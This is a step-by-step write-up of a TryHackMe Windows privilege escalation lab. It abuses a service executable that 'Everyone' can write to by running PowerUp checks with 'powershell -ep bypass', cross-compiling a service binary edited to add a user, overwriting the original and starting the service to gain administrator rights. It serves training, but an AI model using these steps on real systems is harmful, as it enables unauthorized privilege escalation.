# service-escalation-executable-files

*credit to THM* | https://tryhackme.com/room/windowsprivescarena

1) Start PowerShell:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user> powershell -ep bypass`

2) Run *PowerUp.ps1*:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`PS C:\Users\user> . ./PowerUp.ps1`
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`PS C:\Users\user> Invoke-AllChecks`

* Note that the 'Everyone' user group has full permissions on the 'filepermservice.exe' service executable.

3) Start *pyftpdlib* on Kali:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$ python3 -m pyftpdlib -p 21 --write`

* Note: if pyftpdlib is not installed do the following:

[![Image of install](https://github.com/kam1n0/service-escalation-registry/blob/master/tmp_upload/install.png)](#)

4) Copy *windows_service.c* from windows machine:

[![Image of ftp](https://github.com/kam1n0/service-escalation-registry/blob/master/tmp_upload/ftp.png)](#)

* Observe *windows_service.c* was received by the FTP server on Kali

[![Image of upload](https://github.com/kam1n0/service-escalation-registry/blob/master/tmp_upload/upload.png)](#)

5) Edit *windows_service.c* to include the command to add a new user:

[![Image of edit](https://github.com/kam1n0/service-escalation-registry/blob/master/tmp_upload/edit.png)](#)

6) Compile *windows_service.c*:

[![Image of compile](https://github.com/kam1n0/service-escalation-registry/blob/master/tmp_upload/compile.png)](#)

* Note: install *gcc-wingw-w64* if it is not installed

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$ sudo apt-get install gcc-mingw-w64`

7) Transfer *filepermservice.exe* to windows victim machine:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user> get filepermservice.exe`

8) Copy *filepermservice.exe* to C:\Program Files\File Permissions Service:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user\Desktop> cp filepermservice.exe C:\Program Files\File Permissions Service`

9) Start *filepermsvc* service:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user\Desktop> sc start filepermsvc`

10) Confirm that the user was added to the local administrators group by typing the following:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user\Desktop> net localgroup administrators`
